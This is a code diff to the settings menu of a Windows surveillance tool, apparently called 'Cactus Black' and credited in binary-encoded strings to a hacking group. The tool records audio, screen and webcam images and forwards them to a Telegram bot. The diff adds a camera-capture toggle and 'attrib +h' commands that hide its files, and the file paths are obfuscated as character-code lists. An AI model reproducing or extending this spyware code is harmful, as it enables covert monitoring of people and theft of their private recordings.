@@ -6,6 +6,8 @@ import pygame
 from tkinter import Tk, Button, Label
 from tkinter.filedialog import askdirectory
 import json
+import subprocess
+
 
 def Load_Data_Setting(ret = "str"):
     global DefaultSetting
@@ -17,6 +19,9 @@ def Load_Data_Setting(ret = "str"):
         "screen" : {
             "Rs" : "True",
             "TRs" : "180",
+        },
+        "Camera" : {
+            "G" : "True",
         },
         "startup" : {
             "Ls" : "True",
@@ -33,13 +38,7 @@ def Load_Data_Setting(ret = "str"):
             "Dir":"C:/LOG_Program_Cactus_Black",
         }
     }
-    try:
-        file_Setting = open(''.join([chr(value) for value in [67,
-            58, 47, 76, 79, 71, 95, 80, 114, 111, 103, 114, 97, 109, 95,
-            67, 97, 99, 116, 117, 115, 95, 66, 108, 97, 99, 107, 47, 83,
-            101, 116, 116, 105, 110, 103, 46, 67, 97, 99, 116, 117, 115,
-            95, 66, 108, 97, 99, 107]]),"r")
-    except:
+    def Create():
         file_Setting = open(''.join([chr(value) for value in [67,
             58, 47, 76, 79, 71, 95, 80, 114, 111, 103, 114, 97, 109, 95,
             67, 97, 99, 116, 117, 115, 95, 66, 108, 97, 99, 107, 47, 83,
@@ -52,10 +51,28 @@ def Load_Data_Setting(ret = "str"):
             67, 97, 99, 116, 117, 115, 95, 66, 108, 97, 99, 107, 47, 83,
             101, 116, 116, 105, 110, 103, 46, 67, 97, 99, 116, 117, 115,
             95, 66, 108, 97, 99, 107]]),"r")
+    try:
+        file_Setting = open(''.join([chr(value) for value in [67,
+            58, 47, 76, 79, 71, 95, 80, 114, 111, 103, 114, 97, 109, 95,
+            67, 97, 99, 116, 117, 115, 95, 66, 108, 97, 99, 107, 47, 83,
+            101, 116, 116, 105, 110, 103, 46, 67, 97, 99, 116, 117, 115,
+            95, 66, 108, 97, 99, 107]]),"r")
+        # Scan File Setting For Check Data
+        file_Data = file_Setting.read()
+        All = ["Audiu","Ra","TRa","screen","Rs","TRs","Camera",
+               "G","startup","Ls","Delete","De","TelBot","Tb",
+               "ID","API","Folder","Dir"]
+        Scan = file_Data.split('"')
+        for i in Scan :
+            for One in All :
+                if One == i : All.remove(One)
+        if All != [] : Create()
+    except:
+        Create()
     if ret == "str" :
-        return file_Setting.read()
+        return file_Data
     elif ret == "List":
-        return json.loads(file_Setting.read())
+        return json.loads(file_Data)
 
 def SetValueToSetting(Root, Name, Value, SettingNow):
     file_Setting_New = open(''.join([chr(value) for value in [67, 58,
@@ -71,32 +88,36 @@ def SetValueToSetting(Root, Name, Value, SettingNow):
 def Install_Program(Folder_ROOT="C:/"):
     if "LOG_Program_Cactus_Black" not in os.listdir(Folder_ROOT) :
         os.mkdir(Folder_ROOT+"LOG_Program_Cactus_Black")
-        if "Setting.Cactus_Black" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
-            Load_Data_Setting()
-        if "Install.ini" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
-            Install = open(Folder_ROOT+"LOG_Program_Cactus_Black/"+"Install.ini", "w")
-            Install.write("01000011 01110010 01100101 01100001 01110100 01101001 01101110 01100111 00100000 01110111 01101000 01101001 01110100 00100000 01000011 01100001 01100011 01110100 01110101 01110011 00100000 01000010 01101100 01100001 01100011 01101011 00100000 01000111 01110010 01110101 01110000 00001010 01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01110100 00101110 01101101 01100101 00101111 01000111 01110010 01110101 01110000 01011111 01001000 01100001 01100011 01101011 01101001 01101110 01100111 01011111 01000011 01100001 01100011 01110100 01110101 01110011 01011111 01000010 01101100 01100001 01100011 01101011")
-            Install.close()
-        if "License.ini" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
-            License = open(Folder_ROOT+"LOG_Program_Cactus_Black/"+"License.ini", "w")
-            License.write("01000011 01110010 01100101 01100001 01110100 01101001 01101110 01100111 00100000 01110111 01101000 01101001 01110100 00100000 01000011 01100001 01100011 01110100 01110101 01110011 00100000 01000010 01101100 01100001 01100011 01101011 00100000 01000111 01110010 01110101 01110000 00001010 01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01110100 00101110 01101101 01100101 00101111 01000111 01110010 01110101 01110000 01011111 01001000 01100001 01100011 01101011 01101001 01101110 01100111 01011111 01000011 01100001 01100011 01110100 01110101 01110011 01011111 01000010 01101100 01100001 01100011 01101011")
-            License.close()
-        if "TimeLog.Cactus_Black" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
-            TimeLog = open(Folder_ROOT+"LOG_Program_Cactus_Black/"+"TimeLog.Cactus_Black", "w")
-            TimeLog.close()
-        if "ErrorLog.Cactus_Black" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
-            ErrorLog = open(Folder_ROOT+"LOG_Program_Cactus_Black/"+"ErrorLog.Cactus_Black", "w")
-            ErrorLog.close()
-        if "DataBase.Cactus_Black" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
-            DataBase = open(Folder_ROOT+"LOG_Program_Cactus_Black/"+"DataBase.Cactus_Black", "w")
-            DataBase.write("01000011 01110010 01100101 01100001 01110100 01101001 01101110 01100111 00100000 01110111 01101000 01101001 01110100 00100000 01000011 01100001 01100011 01110100 01110101 01110011 00100000 01000010 01101100 01100001 01100011 01101011 00100000 01000111 01110010 01110101 01110000 00001010 01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01110100 00101110 01101101 01100101 00101111 01000111 01110010 01110101 01110000 01011111 01001000 01100001 01100011 01101011 01101001 01101110 01100111 01011111 01000011 01100001 01100011 01110100 01110101 01110011 01011111 01000010 01101100 01100001 01100011 01101011")
-            DataBase.close()
-        if "ScreenRecords" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
-            os.mkdir(Folder_ROOT+"LOG_Program_Cactus_Black/"+"ScreenRecords")
-        if "AudiuRecords" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
-            os.mkdir(Folder_ROOT+"LOG_Program_Cactus_Black/"+"AudiuRecords")
-        if "CameraRecords" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
-            os.mkdir(Folder_ROOT+"LOG_Program_Cactus_Black/"+"CameraRecords")
+    if "Setting.Cactus_Black" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
+        Load_Data_Setting()
+    if "Install.ini" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
+        Install = open(Folder_ROOT+"LOG_Program_Cactus_Black/"+"Install.ini", "w")
+        Install.write("01000011 01110010 01100101 01100001 01110100 01101001 01101110 01100111 00100000 01110111 01101000 01101001 01110100 00100000 01000011 01100001 01100011 01110100 01110101 01110011 00100000 01000010 01101100 01100001 01100011 01101011 00100000 01000111 01110010 01110101 01110000 00001010 01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01110100 00101110 01101101 01100101 00101111 01000111 01110010 01110101 01110000 01011111 01001000 01100001 01100011 01101011 01101001 01101110 01100111 01011111 01000011 01100001 01100011 01110100 01110101 01110011 01011111 01000010 01101100 01100001 01100011 01101011")
+        Install.close()
+    if "License.ini" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
+        License = open(Folder_ROOT+"LOG_Program_Cactus_Black/"+"License.ini", "w")
+        License.write("01000011 01110010 01100101 01100001 01110100 01101001 01101110 01100111 00100000 01110111 01101000 01101001 01110100 00100000 01000011 01100001 01100011 01110100 01110101 01110011 00100000 01000010 01101100 01100001 01100011 01101011 00100000 01000111 01110010 01110101 01110000 00001010 01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01110100 00101110 01101101 01100101 00101111 01000111 01110010 01110101 01110000 01011111 01001000 01100001 01100011 01101011 01101001 01101110 01100111 01011111 01000011 01100001 01100011 01110100 01110101 01110011 01011111 01000010 01101100 01100001 01100011 01101011")
+        License.close()
+    if "TimeLog.Cactus_Black" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
+        TimeLog = open(Folder_ROOT+"LOG_Program_Cactus_Black/"+"TimeLog.Cactus_Black", "w")
+        TimeLog.close()
+    if "ErrorLog.Cactus_Black" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
+        ErrorLog = open(Folder_ROOT+"LOG_Program_Cactus_Black/"+"ErrorLog.Cactus_Black", "w")
+        ErrorLog.close()
+    if "DataBase.Cactus_Black" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
+        DataBase = open(Folder_ROOT+"LOG_Program_Cactus_Black/"+"DataBase.Cactus_Black", "w")
+        DataBase.write("01000011 01110010 01100101 01100001 01110100 01101001 01101110 01100111 00100000 01110111 01101000 01101001 01110100 00100000 01000011 01100001 01100011 01110100 01110101 01110011 00100000 01000010 01101100 01100001 01100011 01101011 00100000 01000111 01110010 01110101 01110000 00001010 01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01110100 00101110 01101101 01100101 00101111 01000111 01110010 01110101 01110000 01011111 01001000 01100001 01100011 01101011 01101001 01101110 01100111 01011111 01000011 01100001 01100011 01110100 01110101 01110011 01011111 01000010 01101100 01100001 01100011 01101011")
+        DataBase.close()
+    if "ScreenRecords" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
+        os.mkdir(Folder_ROOT+"LOG_Program_Cactus_Black/"+"ScreenRecords")
+    if "AudiuRecords" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
+        os.mkdir(Folder_ROOT+"LOG_Program_Cactus_Black/"+"AudiuRecords")
+    if "CameraRecords" not in os.listdir(Folder_ROOT+"LOG_Program_Cactus_Black/") :
+        os.mkdir(Folder_ROOT+"LOG_Program_Cactus_Black/"+"CameraRecords")
+
+    subprocess.run(f'attrib +h "{Folder_ROOT+"LOG_Program_Cactus_Black/"+"Install.ini"}"', cwd='C:\Windows\system32', shell=True)
+    subprocess.run(f'attrib +h "{Folder_ROOT+"LOG_Program_Cactus_Black/"+"License.ini"}"', cwd='C:\Windows\system32', shell=True)
+    subprocess.run(f'attrib +h "{Folder_ROOT+"LOG_Program_Cactus_Black/"+"Setting.Cactus_Black"}"', cwd='C:\Windows\system32', shell=True)
 
 Install_Program()
 
@@ -118,6 +139,23 @@ def select_folder():
         Directory_SIZE = str(Directory_SIZE_NOT_UI)+" GB"
         SIZE_TEXT.set_title("Size Folder Data : "+Directory_SIZE)
         Set("Folder", "Dir", folder_selected+"/LOG_Program_Cactus_Black")
+
+def Clear_Data():
+    global Directory_SIZE_NOT_UI,Directory_SIZE
+    Folder = Load_Data_Setting("List")["Folder"]["Dir"]
+    ROOTDIR = ["AudiuRecords","CameraRecords","ScreenRecords"]
+    for i in ROOTDIR :
+        for file in os.listdir(Folder+"/"+i):
+            try:
+                os.remove(Folder+"/"+i+"/"+file)
+            except Exception as e:
+                pass
+    os.remove(Folder+"/ErrorLog.Cactus_Black")
+    os.remove(Folder+"/TimeLog.Cactus_Black")
+
+    Directory_SIZE_NOT_UI = 0.000
+    Directory_SIZE = str(Directory_SIZE_NOT_UI)+" GB"
+    SIZE_TEXT.set_title("Size Folder Data : "+Directory_SIZE)
 
 Directory_Address = "C:/LOG_Program_Cactus_Black"
 Directory_SIZE_NOT_UI = get_folder_size(Directory_Address)
@@ -165,10 +203,14 @@ def Set(root, Name, Value):
 def save(Exit):
     # Delete the old file if it exists
     if (os.path.exists('C:/LOG_Program_Cactus_Black/Setting_New.Cactus_Black') and
-    os.path.exists('C:/LOG_Program_Cactus_Black/Setting.Cactus_Black')) :
+     os.path.exists('C:/LOG_Program_Cactus_Black/Setting.Cactus_Black')) :
         # Remove Back File
-        os.remove('C:/LOG_Program_Cactus_Black/Setting.Cactus_Black')
+        try:
+            os.remove('C:/LOG_Program_Cactus_Black/Setting_Old.Cactus_Black')
+        except FileNotFoundError:
+            pass
         # Rename the new file to the old file's name
+        os.rename('C:/LOG_Program_Cactus_Black/Setting.Cactus_Black', 'C:/LOG_Program_Cactus_Black/Setting_Old.Cactus_Black')
         os.rename('C:/LOG_Program_Cactus_Black/Setting_New.Cactus_Black', 'C:/LOG_Program_Cactus_Black/Setting.Cactus_Black')
         if Exit : exit()
     else:
@@ -181,7 +223,7 @@ Record_audio = menu.add.toggle_switch("Record audio",
     width=80,background_color=(170,180,190)).translate(-10, 0)
 # Recording time
 Ra_T = menu.add.label("Change recording time (in seconds): ",background_color=(170,180,190))
-Ra_S = Record_audio_Time = menu.add.range_slider("", default=int(Load_Data_Setting("List")["Audiu"]["TRa"]), range_values=(0, 1000),
+Ra_S = Record_audio_Time = menu.add.range_slider("", default=float(Load_Data_Setting("List")["Audiu"]["TRa"]), range_values=(0, 1000),
     increment=1, onchange=lambda value: Set("Audiu", "TRa", str(value)))
 # Screen recording settings
 Record_screen = menu.add.toggle_switch("Record screen",
@@ -189,8 +231,12 @@ Record_screen = menu.add.toggle_switch("Record screen",
     width=80,background_color=(170,180,190)).translate(-10, 0)
 # Recording time
 Rs_T = menu.add.label("Change recording time (in seconds): ",background_color=(170,180,190))
-Rs_S = Record_screen_Time = menu.add.range_slider("", default=int(Load_Data_Setting("List")["screen"]["TRs"]), range_values=(0, 1000),
+Rs_S = Record_screen_Time = menu.add.range_slider("", default=float(Load_Data_Setting("List")["screen"]["TRs"]), range_values=(0, 1000),
 increment=1, onchange=lambda value: Set("screen", "TRs", str(value)))
+# Get Pictur of Camera
+Log_startup_time = menu.add.toggle_switch("Get Pictur of Camera",
+    default=bool(Load_Data_Setting("List")["Camera"]["G"]), onchange=lambda value: Set("Camera", "G", value),
+    width=80,background_color=(170,180,190)).translate(-10, 0)
 # Log system startup time
 Log_startup_time = menu.add.toggle_switch("Log startup time",
     default=bool(Load_Data_Setting("List")["startup"]["Ls"]), onchange=lambda value: Set("startup", "Ls", value),
@@ -201,17 +247,23 @@ D_extra_files = menu.add.toggle_switch("Delete extra files",
     width=80,background_color=(170,180,190)).translate(-10, 0)
 # Send files to Telegram bot
 Record_audio = menu.add.toggle_switch("Send to Telegram bot",
-    default=bool(Load_Data_Setting("List")["TelBot"]["Tb"]),onchange=lambda value: toggle_input([TOKEN_BOT,TOKEN_BOT_Title,Chat_Id,Chat_Id_Title]),
+    default=bool(Load_Data_Setting("List")["TelBot"]["Tb"]),onchange=lambda value: [toggle_input([TOKEN_BOT,TOKEN_BOT_Title,Chat_Id,Chat_Id_Title]),Set("TelBot","Tb", value)],
     width=80,background_color=(170,180,190)).translate(-10, 0)
 # Telegram bot token and chat ID for sending files
 TOKEN_BOT_Title = menu.add.label("Token Bot :",background_color=(170,180,190))
-TOKEN_BOT = menu.add.text_input("", default=Load_Data_Setting("List")["TelBot"]["API"],background_color=(170,180,190))
+TOKEN_BOT = menu.add.text_input("", default=Load_Data_Setting("List")["TelBot"]["API"],
+                                onchange=lambda value: Set("TelBot","API", value),
+                                background_color=(240,240,240))
 Chat_Id_Title = menu.add.label("Chat Id :",background_color=(170,180,190))
-Chat_Id =  menu.add.text_input("", default=Load_Data_Setting("List")["TelBot"]["ID"],background_color=(170,180,190))
+Chat_Id =  menu.add.text_input("", default=Load_Data_Setting("List")["TelBot"]["ID"],
+                               onchange=lambda value: Set("TelBot","ID", value),
+                               background_color=(240,240,240))
 # Change data location
 menu.add.label("")
 menu.add.label("")
-ChangeLocation_B = menu.add.button("Change Location",lambda: select_folder(),background_color=(170,180,190)).translate(0,0)
+button_frame0 = menu.add.frame_h(width=350, height=50, background_color=(50, 50, 60))
+button_frame0.pack(menu.add.button("Change Location",lambda: select_folder(),background_color=(170,180,190)).translate(10,0))
+button_frame0.pack(menu.add.button("Clear Data",lambda: Clear_Data(),background_color=(170,180,190)).translate(30,0))
 # Display data size
 menu.add.label("")
 menu.add.label("")
@@ -219,11 +271,13 @@ SIZE_TEXT = menu.add.label("Size Folder Data : "+Directory_SIZE)
 menu.add.label("")
 # Create a horizontal frame for the last three buttons
 button_frame = menu.add.frame_h(width=300, height=50, background_color=(50, 50, 60))
-button_frame.pack(menu.add.button("Exit", lambda: pygame_menu.events.EXIT,background_color=(255,0,0)))
-button_frame.pack(menu.add.button("Save & Exit", lambda: save(True),background_color=(0,255,0)))
-button_frame.pack(menu.add.button("Apply", lambda: save(False),background_color=(0,255,0)))
+button_frame.pack(menu.add.button("Exit", lambda: pygame_menu.events.EXIT,background_color=(255,0,0)).translate(10,0))
+button_frame.pack(menu.add.button("Save & Exit", lambda: save(True),background_color=(0,255,0)).translate(30,0))
+button_frame.pack(menu.add.button("Apply", lambda: save(False),background_color=(0,255,0)).translate(50,0))
 
-toggle_input([TOKEN_BOT,TOKEN_BOT_Title,Chat_Id,Chat_Id_Title])
+if bool(Load_Data_Setting("List")["TelBot"]["Tb"]) == False : toggle_input([TOKEN_BOT,TOKEN_BOT_Title,Chat_Id,Chat_Id_Title])
 if bool(Load_Data_Setting("List")["Audiu"]["Ra"]) == False : toggle_input([Ra_T,Ra_S])
 if bool(Load_Data_Setting("List")["screen"]["Rs"]) == False : toggle_input([Rs_T,Rs_S])
 menu.mainloop(surface)
+
+
